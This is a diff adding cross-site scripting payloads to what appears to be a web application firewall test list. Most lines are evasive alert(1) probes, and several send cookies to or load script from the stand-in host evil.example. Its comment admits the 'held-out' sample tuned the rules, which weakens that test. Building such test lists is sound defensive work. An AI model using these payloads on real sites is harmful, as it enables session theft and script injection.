@@ -112,3 +112,31 @@ __proto__[v-if]=_c.constructor('alert(1)')()
 \"autof<x>ocus o<x>nfocus=alert<x>(1)//
 <img src=x on<x>error=alert(1)>
 javascript: alert(1)
+
+# === Held-out sample: written after the GoTestWAF fixes, then used to tune the last rules ===
+<script>fetch('//evil.example/?c='+document.cookie)</script>
+<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<body onpageshow=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href="javascript:alert(1)">x</a>
+<input autofocus onfocus=alert(document.domain)>
+<video><source onerror=alert(1)>
+"><svg/onload=alert(/xss/)>
+'-alert(1)-'
+</script><script>alert(1)</script>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<form><button formaction=javascript:alert(1)>x
+<link rel=stylesheet href=javascript:alert(1)>
+<x contenteditable onblur=alert(1)>lol
+javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<img src=x onerror="window['al'+'ert'](1)">
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<svg onload=setTimeout('alert(1)')>
+<img src=x onerror=Function('alert(1)')()>
+<script>location='//evil.example/'+document.cookie</script>
+<script src=//evil.example/x.js></script>
+<body background=javascript:alert(1)>
+<img/src/onerror=alert(1)>
